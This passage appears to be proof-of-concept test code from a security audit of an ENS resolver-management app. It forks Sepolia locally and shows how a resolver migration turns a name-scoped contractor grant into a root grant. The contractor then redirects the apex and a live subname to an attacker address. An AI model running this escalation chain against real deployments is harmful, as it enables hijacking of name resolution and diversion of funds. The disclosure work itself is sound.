              'content-type': 'application/json',
              'content-length': Buffer.byteLength(body),
            },
          },
          (res) => {
            let data = ''
            res.on('data', (c) => {
              data += c
            })
            res.on('end', () => {
              try {
                const json = JSON.parse(data)
                if (json.error) reject(new Error(JSON.stringify(json.error)))
                else resolve(json.result)
              } catch (e) {
                reject(e)
              }
            })
          },
        )
        req.on('error', reject)
        req.write(body)
        req.end()
      })
    },
  })

// ── the chain harness ───────────────────────────────────────────────────────
const FORK_URL =
  process.env.POC_FORK_URL ??
  // The repo's own Sepolia endpoint (apps/manager/src/lib/wagmi.ts:19) — shipped
  // in the browser bundle and documented there as not secret. Override with
  // POC_FORK_URL; the pinned block needs an archive endpoint, so with a
  // non-archive one set POC_FORK_BLOCK=head.
  'https://lb.drpc.live/sepolia/AnmpasF2C0JBqeAEzxVO8aTDnH6wviUR8JD3QmlfqV1j'
let anvil: ChildProcess | undefined

const FORK_BLOCK = process.env.POC_FORK_BLOCK ?? '11661247'
let rpc = process.env.POC_RPC ?? ''
/** URL the APP talks to — the shim below, which fronts anvil. */
let appRpc = ''
let shim: Server | undefined
let pub: ReturnType<typeof createPublicClient>
const walletFor = (account: Address) =>
  createWalletClient({ account, chain: sepolia, transport: nodeRpc(rpc) })

const sendFrom = (account: Address, to: Address, data: Hex) =>
  walletFor(account)
    .sendTransaction({ to, data, chain: sepolia })
    .then((hash) => pub.waitForTransactionReceipt({ hash }))

beforeAll(async () => {
  if (!rpc) {
    const port = 8600 + Math.floor(Math.random() * 300)
    rpc = `http://127.0.0.1:${port}`
    anvil = spawn(
      'anvil',
      [
        '--fork-url',
        FORK_URL,
        ...(FORK_BLOCK === 'head' ? [] : ['--fork-block-number', FORK_BLOCK]),
        '--chain-id',
        '11155111',
        '--port',
        String(port),
        '--host',
        '127.0.0.1',
        '--silent',
      ],
      { stdio: 'ignore' },
    )
  }
  pub = createPublicClient({ chain: sepolia, transport: nodeRpc(rpc) })
  let ready = false
  for (let i = 0; i < 300; i++) {
    try {
      await pub.getBlockNumber()
      ready = true
      break
    } catch {
      await new Promise((r) => setTimeout(r, 500))
    }
  }
  if (!ready) {
    throw new Error(
      `anvil did not come up at ${rpc} within 150s.\n` +
        `  - is \`anvil\` on PATH?  (foundryup)\n` +
        `  - is the fork RPC reachable? override it with POC_FORK_URL=<sepolia rpc>\n` +
        `  - already have a fork running? reuse it with POC_RPC=http://127.0.0.1:8545`,
    )
  }
  const test = createTestClient({
    chain: sepolia,
    mode: 'anvil',
    transport: nodeRpc(rpc),
  })
  for (const a of [ADMIN, DELEGATE, CONTRACTOR]) {
    await test.impersonateAccount({ address: a })
    await test.setBalance({ address: a, value: 10n ** 21n })
  }

  await new Promise<void>((resolve) => {
    shim = createServer((req, res) => {
      let body = ''
      req.on('data', (c) => {
        body += c
      })
      req.on('end', () => {
        let payload = body
        try {
          const json = JSON.parse(body)
          if (json.method === 'wallet_sendTransaction') {
            json.method = 'eth_sendTransaction'
            payload = JSON.stringify(json)
          }
        } catch {
          /* forward as-is */
        }
        const u = new URL(rpc)
        const proxied = nodeHttpRequest(
          {
            hostname: u.hostname,
            port: u.port,
            path: u.pathname || '/',
            method: 'POST',
            headers: {
              'content-type': 'application/json',
              'content-length': Buffer.byteLength(payload),
            },
          },
          (r) => {
            res.writeHead(r.statusCode ?? 200, {
              'content-type': 'application/json',
            })
            r.pipe(res)
          },
        )
        proxied.on('error', () => {
          res.writeHead(500)
          res.end('{}')
        })
        proxied.write(payload)
        proxied.end()
      })
    })
    shim.listen(0, '127.0.0.1', () => {
      const addr = shim?.address()
      appRpc = `http://127.0.0.1:${typeof addr === 'object' && addr ? addr.port : 0}`
      resolve()
    })
  })

  const forkChain = {
    ...sepoliaWithEns,
    rpcUrls: {
      default: { http: [appRpc] },
      public: { http: [appRpc] },
    },
  } as typeof sepoliaWithEns
  anvilConfig = createConfig({
    chains: [forkChain],
    connectors: [mock({ accounts: [ADMIN] })],
    transports: { [forkChain.id]: nodeRpc(appRpc) },
  })
  // eslint-disable-next-line no-console
  console.log(`[F1] fork ready at block ${await pub.getBlockNumber()}`)
}, 300_000)

afterAll(() => {
  shim?.close()
  anvil?.kill('SIGKILL')
})
beforeEach(() => {
  handedOff.length = 0
  vi.spyOn(transactionManager, 'startTransaction').mockImplementation(
    (intent: unknown) => {
      const req = (intent as { request?: { to?: Address; data?: Hex } }).request
      if (req?.data) handedOff.push({ to: req.to as Address, data: req.data })
      return 'poc-f1-tx' as never
    },
  )
})

afterEach(() => {
  vi.restoreAllMocks()
  cleanup()
  // The modal's open-state is a single app-wide atom and the transaction map is
  // a module singleton (see useTransactionModal.ts / poc-c06). Reset both, or a
  // modal left open by one test renders over the next test's sidebar.
  closeTransactionModal()
  transactionManager.clear()
})

const AutoConnect = () => {
  const { status } = useConnection()
  const { connect, connectors } = useConnect()
  useEffect(() => {
    if (status !== 'disconnected') return
    if (connectors[0]) connect({ connector: connectors[0] })
  }, [status, connect, connectors])
  return null
}

const TransactionManagerSetup = ({
  children,
}: {
  children: React.ReactNode
}) => {
  const publicClient = usePublicClient()
  useEffect(() => {
    if (publicClient) {
      transactionManager.setPublicClient(sepoliaWithEns.id, publicClient)
    }
  }, [publicClient])
  if (!publicClient) return <>{children}</>
  return (
    <TransactionManagerProvider publicClient={publicClient}>
      {children}
    </TransactionManagerProvider>
  )
}

const renderWithRouter = (ui: React.ReactNode) => {
  const rootRoute = createRootRoute({ component: () => <>{ui}</> })
  const router = createRouter({
    routeTree: rootRoute,
    history: createMemoryHistory({ initialEntries: ['/'] }),
  })
  const queryClient = createTestQueryClient()
  return render(
    <WagmiProvider config={anvilConfig}>
      <QueryClientProvider client={queryClient}>
        <AutoConnect />
        <TransactionManagerSetup>
          <RouterProvider router={router as never} />
        </TransactionManagerSetup>
      </QueryClientProvider>
    </WagmiProvider>,
  )
}

const handedOff: { to: Address; data: Hex }[] = []

/** Drive the REAL TransactionModal the way a user does: Start -> Open wallet. */
const clickThroughWallet = async (user: ReturnType<typeof userEvent.setup>) => {
  await user.click(await screen.findByRole('button', { name: /open wallet/i }))
  await waitFor(() => expect(handedOff.length).toBeGreaterThan(0))
  return handedOff[handedOff.length - 1]
}

const addrOf = (node: Hex) =>
  pub.readContract({
    address: RESOLVER,
    abi: ADDR_ABI,
    functionName: 'addr',
    args: [node],
  })

const nodesFromChain = async () => {
  const out: {
    id: string
    name: string
    owner: { id: string }
    resolver: { id: Address; address: Address }
  }[] = []
  for (const [name] of NAMES) {
    const label = name.split('.')[0]
    const registry = name === 'acme.eth' ? ETH_REGISTRY : ACME_SUBREGISTRY
    const current = (await pub.readContract({
      address: registry,
      abi: GET_RESOLVER_ABI,
      functionName: 'getResolver',
      args: [label],
    })) as string
    if (current.toLowerCase() === RESOLVER) {
      out.push({
        id: name,
        name,
        owner: { id: NODE_OWNERS[name] as string },
        resolver: { id: RESOLVER, address: RESOLVER },
      })
    }
  }
  return out
}

const rolesAt = (resource: Hex, account: Address) =>
  pub.readContract({
    address: RESOLVER,
    abi: ROLES_ABI,
    functionName: 'roles',
    args: [BigInt(resource), account],
  })

const hasRoot = (bit: bigint, account: Address) =>
  pub.readContract({
    address: RESOLVER,
    abi: HAS_ROOT_ROLES_ABI,
    functionName: 'hasRootRoles',
    args: [bit, account],
  })

const contractorSetsAddr = (node: Hex) =>
  walletFor(CONTRACTOR)
    .writeContract({
      address: RESOLVER,
      abi: SET_ADDR_ABI,
      functionName: 'setAddr',
      args: [node, ATTACKER],
      chain: sepolia,
    })
    .then((hash) => pub.waitForTransactionReceipt({ hash }))

const writeReverts = async (pr: Promise<{ readonly status: string }>) =>
  pr
    .then((r) => r.status === 'reverted')
    .catch((e: unknown) => {
      const err = e as {
        message?: string
        details?: string
        shortMessage?: string
      }
      const text = [err?.message, err?.details, err?.shortMessage]
        .filter(Boolean)
        .join('\n')
      if (/revert|EACUnauthorized/i.test(text)) return true
      throw e
    })

const scopedResource = () => computeNameResource(SCOPED_NAME) as Hex

/** One row, as the indexer reports the contractor's single name-scoped grant. */
const contractorRows = () => [
  {
    account: CONTRACTOR,
    resource: scopedResource(),
    roleBitmap: `0x${(1n << 4n).toString(16).padStart(64, '0')}`,
    blockNumber: 1,
    transactionHash: null,
    timestamp: null,
    name: null,
  },
]

/** Open the contractor's row, tick Set Address, Save, and capture the calldata. */
const editRowAndCaptureSave = async (
  user: ReturnType<typeof userEvent.setup>,
  nodes: Awaited<ReturnType<typeof nodesFromChain>>,
) => {
  const canManage = await canManageRolesFromChain()
  renderWithRouter(
    <ResolverRolesTable
      roles={contractorRows()}
      nodes={nodes}
      resolverAddress={RESOLVER}
      canManageRoles={canManage}
    />,
  )
  const cell = await screen.findByText(/0x7099/i)
  const row = cell.closest('tr')
  if (!row) throw new Error('contractor row not rendered')
  await user.click(
    within(row as HTMLElement).getByRole('button', {
      name: /edit user roles/i,
    }),
  )
  await screen.findByRole('button', { name: /remove user/i })
  return { row: row as HTMLElement }
}

const tickSaveAndCapture = async (user: ReturnType<typeof userEvent.setup>) => {
  const box = document.getElementById('ROLE_SET_ADDR-manager')
  if (!box) throw new Error('ROLE_SET_ADDR checkbox not rendered')
  await user.click(box)
  const save = screen.getByRole('button', { name: /^save$/i })
  await waitFor(() => expect(save).not.toBeDisabled())
  await user.click(save)
  await user.click(await screen.findByRole('button', { name: /^start$/i }))
  return clickThroughWallet(user)
}

const canManageRolesFromChain = () =>
  pub.readContract({
    address: RESOLVER,
    abi: HAS_ROOT_ROLES_ABI,
    functionName: 'hasRootRoles',
    args: [1n << 0n, ADMIN],
  }) as Promise<boolean>

describe('F1-C — PATH B: routine resolver migration arms a correct grant for ROOT', () => {
  it('0. PRECONDITIONS on chain: contractor clean, name wired to this resolver', async () => {
    for (const bit of [1n << 0n, 1n << 4n]) {
      expect(await hasRoot(bit, CONTRACTOR), 'contractor starts clean').toBe(
        false,
      )
    }
    expect(await rolesAt(scopedResource(), CONTRACTOR)).toBe(0n)
    expect(await hasRoot(1n << 0n, ADMIN), 'admin is a root holder').toBe(true)

    // The subname really resolves through THIS resolver right now, so the
    // grant below is a genuine, correctly-scoped delegation.
    const current = (await pub.readContract({
      address: ACME_SUBREGISTRY,
      abi: GET_RESOLVER_ABI,
      functionName: 'getResolver',
      args: [SCOPED_LABEL],
    })) as string
    expect(
      current.toLowerCase(),
      `${SCOPED_NAME} must be on this resolver`,
    ).toBe(RESOLVER)

    // ...and the derived node list therefore contains it.
    const nodes = await nodesFromChain()
    expect(nodes.map((n) => n.name)).toContain(SCOPED_NAME)

    // NEGATIVE CONTROL: the contractor cannot write a record on this resolver
    // today — not the apex, not the name it is about to be scoped to. Without
    // this, "it can write afterwards" would prove nothing.
    for (const name of [NAMES[0][0], ALREADY_RESOLVING]) {
      const node = (
        NAMES.find(([n]) => n === name) as readonly [string, Hex]
      )[1]
      expect(
        await writeReverts(contractorSetsAddr(node)),
        `contractor must not be able to write ${name} yet`,
      ).toBe(true)
    }
  }, 300_000)

  it('1. IN-SCOPE SETUP: Add User grants a NAME-scoped role on the subname', async () => {
    const user = userEvent.setup({ pointerEventsCheck: 0 })
    renderWithRouter(
      <ResolverAddUserSheet
        open
        onOpenChange={() => {}}
        resolverAddress={RESOLVER}
        nodes={await nodesFromChain()}
      />,
    )
    await user.type(
      await screen.findByPlaceholderText(/name or address/i),
      CONTRACTOR,
    )
    await user.click(screen.getByPlaceholderText('Root (all nodes)'))
    await user.click(await screen.findByText(SCOPED_NAME))
    const box = document.getElementById('add-ROLE_SET_TEXT-manager')
    if (!box) throw new Error('add-user checkbox not rendered')
    await user.click(box)
    const save = await screen.findByRole('button', { name: /^save$/i })
    await waitFor(() => expect(save).not.toBeDisabled())
    await user.click(save)
    await user.click(await screen.findByRole('button', { name: /^start$/i }))
    const handoff = await clickThroughWallet(user)

    // A correct, narrow grant — name scope, not root.
    expect(handoff.data.slice(0, 10)).toBe(
      toFunctionSelector('authorizeNameRoles(bytes,uint256,address,bool)'),
    )
    const receipt = await sendFrom(ADMIN, handoff.to, handoff.data)
    expect(receipt.status).toBe('success')
    expect(await rolesAt(scopedResource(), CONTRACTOR)).not.toBe(0n)
    cleanup()
  }, 300_000)

  it('2. CONTROL — BEFORE migration the row is correct in every respect', async () => {
    const user = userEvent.setup({ pointerEventsCheck: 0 })
    const nodes = await nodesFromChain()
    expect(nodes.map((n) => n.name)).toContain(SCOPED_NAME)

    await editRowAndCaptureSave(user, nodes)

    // The scope IS displayed, correctly and specifically.
    expect(screen.getByText(/Roles scoped to sarah\.acme\.eth/)).toBeVisible()

    // ...and a Save here writes at NAME scope. Same row, same click, correct
    // behaviour — which is what makes test 4 attributable to the migration.
    const handoff = await tickSaveAndCapture(user)
    expect(handoff.data.slice(0, 10)).toBe(
      toFunctionSelector('authorizeNameRoles(bytes,uint256,address,bool)'),
    )
    expect(handoff.data.slice(0, 10)).not.toBe(
      toFunctionSelector('grantRootRoles(uint256,address)'),
    )
    cleanup()
  }, 300_000)

  it('3. IN-SCOPE MIGRATION: the real Change Resolver form moves the subname', async () => {
    const user = userEvent.setup({ pointerEventsCheck: 0 })
    renderWithRouter(
      <ChangeResolverForm
        name={SCOPED_NAME}
        registryAddress={ACME_SUBREGISTRY}
      />,
    )
    // The form opens with "Use custom resolver" already on, so the address
    // input is present immediately — toggling the switch would turn it OFF.
    await user.type(await screen.findByPlaceholderText('0x...'), NEW_RESOLVER)
    await user.click(
      await screen.findByRole('button', { name: /save changes/i }),
    )
    await user.click(await screen.findByRole('button', { name: /^start$/i }))
    const handoff = await clickThroughWallet(user)

    // The app's own setResolver call, sent by the admin.
    const receipt = await sendFrom(ADMIN, handoff.to, handoff.data)
    expect(receipt.status).toBe('success')

    const now = (await pub.readContract({
      address: ACME_SUBREGISTRY,
      abi: GET_RESOLVER_ABI,
      functionName: 'getResolver',
      args: [SCOPED_LABEL],
    })) as string
    expect(now.toLowerCase(), 'the subname has moved').toBe(
      NEW_RESOLVER.toLowerCase(),
    )

    // THE ROLE ROW SURVIVES. Registry pointer and resolver ACL are independent.
    expect(
      await rolesAt(scopedResource(), CONTRACTOR),
      'the grant is still on the OLD resolver',
    ).not.toBe(0n)
    cleanup()
  }, 300_000)

  it('4. THE DEFECT: the same row is now blank, and Save grants at ROOT', async () => {
    const user = userEvent.setup({ pointerEventsCheck: 0 })

    // Derived from chain: the migrated name drops out on its own.
    const nodes = await nodesFromChain()
    expect(
      nodes.map((n) => n.name),
      'the migrated name is no longer a node of this resolver',
    ).not.toContain(SCOPED_NAME)

    await editRowAndCaptureSave(user, nodes)

    // Nothing is displayed now — not the name, not "(root)", not a warning.
    expect(screen.queryByText(SCOPED_NAME)).toBeNull()
    expect(screen.queryByText(/Roles scoped to/)).toBeNull()
    expect(screen.queryByText('Global roles (all names)')).toBeNull()

    const handoff = await tickSaveAndCapture(user)
    expect(handoff.data.slice(0, 10)).toBe(
      toFunctionSelector('grantRootRoles(uint256,address)'),
    )

    const receipt = await sendFrom(ADMIN, handoff.to, handoff.data)
    expect(receipt.status).toBe('success')
  }, 300_000)

  it('5. IMPACT: the contractor writes names it was never scoped to, and redirects a live one', async () => {
    expect(
      await hasRoot(1n << 0n, CONTRACTOR),
      'a name-scoped grant became resolver-wide',
    ).toBe(true)

    // And it is real authority: the apex, which was never in scope, is writable.
    const receipt = await walletFor(CONTRACTOR)
      .writeContract({
        address: RESOLVER,
        abi: SET_ADDR_ABI,
        functionName: 'setAddr',
        args: [NAMES[0][1], ATTACKER],
        chain: sepolia,
      })
      .then((hash) => pub.waitForTransactionReceipt({ hash }))
    expect(receipt.status, 'contractor can now write acme.eth').toBe('success')
    expect((await addrOf(NAMES[0][1])).toLowerCase()).toBe(
      ATTACKER.toLowerCase(),
    )

    const liveNode = (
      NAMES.find(([n]) => n === ALREADY_RESOLVING) as readonly [string, Hex]
    )[1]

    const priorAddr = (await addrOf(liveNode)).toLowerCase()
    expect(
      priorAddr,
      `${ALREADY_RESOLVING} resolved before the write`,
    ).not.toBe('0x0000000000000000000000000000000000000000')
    expect(priorAddr, 'and not already to the attacker').not.toBe(
      ATTACKER.toLowerCase(),
    )

    const redirect = await walletFor(CONTRACTOR)
      .writeContract({
        address: RESOLVER,
        abi: SET_ADDR_ABI,
        functionName: 'setAddr',
        args: [liveNode, ATTACKER],
        chain: sepolia,
      })
      .then((hash) => pub.waitForTransactionReceipt({ hash }))
    expect(redirect.status).toBe('success')
    expect(
      (await addrOf(liveNode)).toLowerCase(),
      `${ALREADY_RESOLVING} now resolves to the attacker`,
    ).toBe(ATTACKER.toLowerCase())
  }, 300_000)
})

```

#### poc-f1b-path4-revoke-survives.test.tsx

```ts
import { type ChildProcess, spawn } from 'node:child_process'
import {
  createServer,
  request as nodeHttpRequest,
  type Server,
} from 'node:http'
import { request as nodeHttpsRequest } from 'node:https'
import {
  TransactionManagerProvider,
  transactionManager,
} from '@ens-apps/transaction-manager'
import { QueryClientProvider } from '@tanstack/react-query'
import {
  createMemoryHistory,
  createRootRoute,
  createRouter,
  RouterProvider,
} from '@tanstack/react-router'
import {
  cleanup,
  render,
  screen,
  waitFor,
  within,
} from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { mock } from '@wagmi/connectors'
import { useEffect } from 'react'
import {
  type Address,
  createPublicClient,
  createTestClient,
  createWalletClient,
  custom,
  type Hex,
  toFunctionSelector,
} from 'viem'
import { sepolia } from 'viem/chains'
import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from 'vitest'
import {
  type Config,
  createConfig,
  useConnect,
  useConnection,
  usePublicClient,
  WagmiProvider,
} from 'wagmi'
import { closeTransactionModal } from '@/features/transaction-manager/hooks/useTransactionModal'
import { createTestQueryClient, sepoliaWithEns } from '@/test-utils'

// ── the real production fixture ─────────────────────────────────────────────
const RESOLVER = '0xf846fb5a0e36531c848fb8ae0ea9e9f82f882852' as Address
const ADMIN = '0x05c224fcdb88e75a7178a3c14d92920598ef4e1c' as Address
const DELEGATE = '0x0098fe9be558fa0ba57a0fef68f32eb031f75dd7' as Address

/** The operations contractor. Holds NOTHING on this resolver — asserted in test 0. */
const CONTRACTOR = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8' as Address
/** The one name the contractor is additionally scoped to. Real, live node. */
const SCOPED_NAME = 'sarah.acme.eth'
/** The contract's root resource: 32 zero bytes (resolverRoles.ts:129). */
const ROOT_RESOURCE = `0x${'00'.repeat(32)}` as Hex

const NODE_OWNERS: Readonly<Record<string, string>> = {
  'acme.eth': '0x05c224fcdb88e75a7178a3c14d92920598ef4e1c',
  'sarah.acme.eth': '0x4806d97dcfe6689b7cf094fcd0b08d684bc984a2',
  'payments-bot.acme.eth': '0x0098fe9be558fa0ba57a0fef68f32eb031f75dd7',
  'demo-two.acme.eth': '0xdb768b53719039796ae12f0d97cb5bbbfa7fb862',
  'demo-three.acme.eth': '0x4806d97dcfe6689b7cf094fcd0b08d684bc984a2',
  'demo-four.acme.eth': '0x4806d97dcfe6689b7cf094fcd0b08d684bc984a2',
  'demo-mandate.acme.eth': '0x91b437e16c1b41b3b03467fae632b6d16455263a',
}

const NAMES: readonly (readonly [string, Hex])[] = [
  [
    'acme.eth',
    '0x071164d92aaa35b63eca1e82408f284624fc0f7cc0d84867043120b79ea9e056',
  ],
  [
    'demo-two.acme.eth',
    '0x24d78dcbb852a3833606742f3c56a4ef8d122e442818c583861d5d332368586d',
  ],
  [
    'sarah.acme.eth',
    '0xad96ef982923c64c17d918b58a73b04aeb546650ea844a2ee9898d2db30fb401',
  ],
  [
    'payments-bot.acme.eth',
    '0xae61ad2a32da79edd965f686e63b000ada1a1059ae7286ce11c008238a8bc4f5',
  ],
  [
    'demo-four.acme.eth',
    '0x3a2800afb8e7dfee90c00eaa13eada0c791a6de6f881e56055cb82fbd6e47f3b',
  ],
  [
    'demo-three.acme.eth',
    '0x0dfe67b8ed85ed4d1564c8d8dc26d8d640d5c53256a254070ce52804493c1c7e',
  ],
  [
    'demo-mandate.acme.eth',
    '0xd94ef098e1e94cb5a80da4e20d25e3d944e32acd758c333f128582396e04004c',
  ],
]

const NODES = NAMES.map(([name]) => ({
  id: name,
  name,
  owner: { id: NODE_OWNERS[name] as string },
  resolver: { id: RESOLVER, address: RESOLVER },
}))

const SET_ADDR_ABI = [
  {
    name: 'setAddr',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'node', type: 'bytes32' },
      { name: 'a', type: 'address' },
    ],
    outputs: [],
  },
] as const
const ADDR_ABI = [
  {
    name: 'addr',
    type: 'function',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const
/** A name the contractor was NEVER scoped to — the apex. */
const APEX = 'acme.eth'
/** A name that already resolves to a real address, so writing it is a REDIRECT. */
const ALREADY_RESOLVING = 'payments-bot.acme.eth'
const ATTACKER = '0x00000000000000000000000000000000DeaDBeef' as Address

const ROLES_ABI = [
  {
    name: 'roles',
    type: 'function',
    stateMutability: 'view',
    inputs: [
      { name: 'resource', type: 'uint256' },
      { name: 'account', type: 'address' },
    ],
    outputs: [{ name: '', type: 'uint256' }],
  },
] as const
const HAS_ROOT_ROLES_ABI = [
  {
    name: 'hasRootRoles',
    type: 'function',
    stateMutability: 'view',
    inputs: [
      { name: 'roleBitmap', type: 'uint256' },
      { name: 'account', type: 'address' },
    ],
    outputs: [{ name: '', type: 'bool' }],
  },
] as const

let anvilConfig: Config

import { ResolverAddUserSheet } from '@/features/resolver/components/ResolverAddUserSheet'
import { ResolverRolesTable } from '@/features/resolver/components/ResolverRolesTable'
// The app's OWN resource derivation — used to build a MAPPABLE row for the
// positive control. Not re-implemented here.
import { computeNameResource } from '@/lib/roles/resolverRoles'

const nodeRpc = (url: string) =>
  custom({
    async request({ method, params }: { method: string; params?: unknown }) {
      const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method, params })
      const u = new URL(url)
      return new Promise((resolve, reject) => {
        const req = nodeHttpRequest(
          {
            hostname: u.hostname,
            port: u.port,
            path: u.pathname || '/',
            method: 'POST',
            headers: {
              'content-type': 'application/json',
              'content-length': Buffer.byteLength(body),
            },
          },
          (res) => {
            let data = ''
            res.on('data', (c) => {
              data += c
            })
            res.on('end', () => {
              try {
                const json = JSON.parse(data)
                if (json.error) reject(new Error(JSON.stringify(json.error)))
                else resolve(json.result)
              } catch (e) {
                reject(e)
              }
            })
          },
        )
        req.on('error', reject)
        req.write(body)
        req.end()
      })
    },
  })

const indexerQueryOnce = <T,>(query: string): Promise<T> =>
  new Promise((resolve, reject) => {
    const body = JSON.stringify({ query })
    const req = nodeHttpsRequest(
      {
        hostname: 'staging-graphql.ens.dev',
        path: '/',
        method: 'POST',
        timeout: 15_000,
        headers: {
          'content-type': 'application/json',
          'content-length': Buffer.byteLength(body),
        },
      },
      (res) => {
        let data = ''
        res.on('data', (c) => {
          data += c
        })
        res.on('end', () => {
          try {
            resolve(JSON.parse(data) as T)
          } catch (e) {
            reject(e)
          }
        })
      },
    )
    req.on('timeout', () => req.destroy(new Error('indexer timeout')))
    req.on('error', reject)
    req.write(body)
    req.end()
  })

const indexerQuery = async <T,>(query: string): Promise<T | null> => {
  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      return await indexerQueryOnce<T>(query)
    } catch (e) {
      if (attempt === 3) {
        // eslint-disable-next-line no-console
        console.warn(
          `[F1-B] indexer unreachable (${(e as Error).message}). ` +
            'Skipping the anti-trim cross-check; every on-chain assertion still ran.',
        )
        return null
      }
      await new Promise((r) => setTimeout(r, 1000 * attempt))
    }
  }
  return null
}

// ── the chain harness ───────────────────────────────────────────────────────
const FORK_URL =
  process.env.POC_FORK_URL ??
  // The repo's own Sepolia endpoint (apps/manager/src/lib/wagmi.ts:19) — shipped
  // in the browser bundle and documented there as not secret. Override with
  // POC_FORK_URL; the pinned block needs an archive endpoint, so with a
  // non-archive one set POC_FORK_BLOCK=head.
  'https://lb.drpc.live/sepolia/AnmpasF2C0JBqeAEzxVO8aTDnH6wviUR8JD3QmlfqV1j'
let anvil: ChildProcess | undefined

const FORK_BLOCK = process.env.POC_FORK_BLOCK ?? '11661247'
let rpc = process.env.POC_RPC ?? ''
/** URL the APP talks to — the shim below, which fronts anvil. */
let appRpc = ''
let shim: Server | undefined
let pub: ReturnType<typeof createPublicClient>
const walletFor = (account: Address) =>
  createWalletClient({ account, chain: sepolia, transport: nodeRpc(rpc) })

const sendFrom = (account: Address, to: Address, data: Hex) =>
  walletFor(account)
    .sendTransaction({ to, data, chain: sepolia })
    .then((hash) => pub.waitForTransactionReceipt({ hash }))

beforeAll(async () => {
  if (!rpc) {
    const port = 8600 + Math.floor(Math.random() * 300)
    rpc = `http://127.0.0.1:${port}`
    anvil = spawn(
      'anvil',
      [
        '--fork-url',
        FORK_URL,
        ...(FORK_BLOCK === 'head' ? [] : ['--fork-block-number', FORK_BLOCK]),
        '--chain-id',
        '11155111',
        '--port',
        String(port),
        '--host',
        '127.0.0.1',
        '--silent',
      ],
      { stdio: 'ignore' },
    )
  }
  pub = createPublicClient({ chain: sepolia, transport: nodeRpc(rpc) })
  let ready = false
  for (let i = 0; i < 300; i++) {
    try {
      await pub.getBlockNumber()
      ready = true
      break
    } catch {
      await new Promise((r) => setTimeout(r, 500))
    }
  }
  if (!ready) {
    throw new Error(
      `anvil did not come up at ${rpc} within 150s.\n` +
        `  - is \`anvil\` on PATH?  (foundryup)\n` +
        `  - is the fork RPC reachable? override it with POC_FORK_URL=<sepolia rpc>\n` +
        `  - already have a fork running? reuse it with POC_RPC=http://127.0.0.1:8545`,
    )
  }
  const test = createTestClient({
    chain: sepolia,
    mode: 'anvil',
    transport: nodeRpc(rpc),
  })
  for (const a of [ADMIN, DELEGATE, CONTRACTOR]) {
    await test.impersonateAccount({ address: a })
    await test.setBalance({ address: a, value: 10n ** 21n })
  }

  await new Promise<void>((resolve) => {
    shim = createServer((req, res) => {
      let body = ''
      req.on('data', (c) => {
        body += c
      })
      req.on('end', () => {
        let payload = body
        try {
          const json = JSON.parse(body)
          if (json.method === 'wallet_sendTransaction') {
            json.method = 'eth_sendTransaction'
            payload = JSON.stringify(json)
          }
        } catch {
          /* forward as-is */
        }
        const u = new URL(rpc)
        const proxied = nodeHttpRequest(
          {
            hostname: u.hostname,
            port: u.port,
            path: u.pathname || '/',
            method: 'POST',
            headers: {
              'content-type': 'application/json',
              'content-length': Buffer.byteLength(payload),
            },
          },
          (r) => {
            res.writeHead(r.statusCode ?? 200, {
              'content-type': 'application/json',
            })
            r.pipe(res)
          },
        )
        proxied.on('error', () => {
          res.writeHead(500)
          res.end('{}')
        })
        proxied.write(payload)
        proxied.end()
      })
    })
    shim.listen(0, '127.0.0.1', () => {
      const addr = shim?.address()
      appRpc = `http://127.0.0.1:${typeof addr === 'object' && addr ? addr.port : 0}`
      resolve()
    })
  })

  const forkChain = {
    ...sepoliaWithEns,
    rpcUrls: {
      default: { http: [appRpc] },
      public: { http: [appRpc] },
    },
  } as typeof sepoliaWithEns
  anvilConfig = createConfig({
    chains: [forkChain],
    connectors: [mock({ accounts: [ADMIN] })],
    transports: { [forkChain.id]: nodeRpc(appRpc) },
  })
  // eslint-disable-next-line no-console
  console.log(`[F1] fork ready at block ${await pub.getBlockNumber()}`)
}, 300_000)

afterAll(() => {
  shim?.close()
  anvil?.kill('SIGKILL')
})
beforeEach(() => {
  handedOff.length = 0
  vi.spyOn(transactionManager, 'startTransaction').mockImplementation(
    (intent: unknown) => {
      const req = (intent as { request?: { to?: Address; data?: Hex } }).request
      if (req?.data) handedOff.push({ to: req.to as Address, data: req.data })
      return 'poc-f1-tx' as never
    },
  )
})

afterEach(() => {
  vi.restoreAllMocks()
  cleanup()
  // The modal's open-state is a single app-wide atom and the transaction map is
  // a module singleton (see useTransactionModal.ts / poc-c06). Reset both, or a
  // modal left open by one test renders over the next test's sidebar.
  closeTransactionModal()
  transactionManager.clear()
})

const AutoConnect = () => {
  const { status } = useConnection()
  const { connect, connectors } = useConnect()
  useEffect(() => {
    if (status !== 'disconnected') return
    if (connectors[0]) connect({ connector: connectors[0] })
  }, [status, connect, connectors])
  return null
}

/**
 * Mirrors `apps/portal/src/routes/__root.tsx:24-43` — the app's own
 * TransactionManagerSetup, which is a module-local component there and so
 * cannot be imported. Same body, same order.
 */
const TransactionManagerSetup = ({
  children,
}: {
  children: React.ReactNode
}) => {
  const publicClient = usePublicClient()
  useEffect(() => {
    if (publicClient) {
      transactionManager.setPublicClient(sepoliaWithEns.id, publicClient)
    }
  }, [publicClient])
  if (!publicClient) return <>{children}</>
  return (
    <TransactionManagerProvider publicClient={publicClient}>
      {children}
    </TransactionManagerProvider>
  )
}

const renderWithRouter = (ui: React.ReactNode) => {
  const rootRoute = createRootRoute({ component: () => <>{ui}</> })
  const router = createRouter({
    routeTree: rootRoute,
    history: createMemoryHistory({ initialEntries: ['/'] }),
  })
  const queryClient = createTestQueryClient()
  return render(
    <WagmiProvider config={anvilConfig}>
      <QueryClientProvider client={queryClient}>
        <AutoConnect />
        <TransactionManagerSetup>
          <RouterProvider router={router as never} />
        </TransactionManagerSetup>
      </QueryClientProvider>
    </WagmiProvider>,
  )
}

const handedOff: { to: Address; data: Hex }[] = []

/** Drive the REAL TransactionModal the way a user does: Start -> Open wallet. */
const clickThroughWallet = async (user: ReturnType<typeof userEvent.setup>) => {
  await user.click(await screen.findByRole('button', { name: /open wallet/i }))
  await waitFor(() => expect(handedOff.length).toBeGreaterThan(0))
  return handedOff[handedOff.length - 1]
}

/** Grant `roles` to CONTRACTOR at `node` ('' = root) via the REAL Add User sheet. */
const grantViaAddUserSheet = async (
  user: ReturnType<typeof userEvent.setup>,
